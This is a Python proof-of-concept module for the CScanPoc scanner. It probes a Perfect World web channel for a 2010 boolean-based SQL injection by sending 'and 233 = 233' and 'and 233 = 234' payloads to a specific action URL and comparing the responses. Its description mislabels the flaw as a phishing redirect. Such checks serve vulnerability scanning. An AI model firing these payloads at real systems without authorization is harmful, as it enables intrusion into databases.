# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Wanmei_0004'  # 平台漏洞编号
    name = '完美时空旗下频道SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2010-09-19'  # 漏洞公布时间
    desc = '''
        完美时空旗下频道SQL注入漏洞，攻击者可以通过构造恶意链接来跳转到恶意网站对用户进行钓鱼攻击。
    '''  # 漏洞描述
    ref = 'Unknown'  # https://wooyun.shuimugan.com/bug/view?bug_no=216
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '完美时空'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6f2c427b-79f7-404b-8a11-62fdde34cd96'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload1 = "/w2i/w2iwemarry/w2iWeMarryPl!list.action?imgid=1424 and 233 = 233"
            payload2 = "/w2i/w2iwemarry/w2iWeMarryPl!list.action?imgid=1424 and 233 = 234"
            vul_url1 = arg + payload1
            vul_url2 = arg + payload2
            response1 = requests.get(vul_url1)
            response2 = requests.get(vul_url2)

            if response1.text != response2.text and (vul_url1 == response1.url or vul_url2 == response2.url) and (response1.status_code == 200 or response2.status_code == 200):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
